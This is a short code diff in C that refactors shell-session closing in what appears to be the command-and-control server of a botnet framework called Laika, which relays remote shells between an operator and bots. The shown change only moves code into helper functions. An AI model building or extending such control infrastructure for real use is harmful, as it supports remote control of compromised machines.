@@ -36,6 +36,24 @@ void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) 
     laikaS_endOutPacket(authPeer);
 }
 
+void laikaC_closeAuthShell(struct sLaika_authInfo *aInfo) {
+    /* forward to SHELL_CLOSE to auth */
+    laikaS_emptyOutPacket(aInfo->shellBot, LAIKAPKT_SHELL_CLOSE);
+
+    /* close shell */
+    ((struct sLaika_botInfo*)(aInfo->shellBot->uData))->shellAuth = NULL;
+    aInfo->shellBot = NULL;
+}
+
+void laikaC_closeBotShell(struct sLaika_botInfo *bInfo) {
+    /* forward to SHELL_CLOSE to auth */
+    laikaS_emptyOutPacket(bInfo->shellAuth, LAIKAPKT_AUTHENTICATED_SHELL_CLOSE);
+
+    /* close shell */
+    ((struct sLaika_authInfo*)(bInfo->shellAuth->uData))->shellBot = NULL;
+    bInfo->shellAuth = NULL;
+}
+
 /* ============================================[[ Packet Handlers ]]============================================= */
 
 void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
@@ -95,12 +113,8 @@ void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT
     if (aInfo->shellBot == NULL)
         return;
 
-    /* forward to SHELL_CLOSE to auth */
-    laikaS_emptyOutPacket(aInfo->shellBot, LAIKAPKT_SHELL_CLOSE);
-
-    /* close shell */
-    ((struct sLaika_botInfo*)(aInfo->shellBot->uData))->shellAuth = NULL;
-    aInfo->shellBot = NULL;
+    
+    laikaC_closeAuthShell(aInfo);
 }
 
 void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
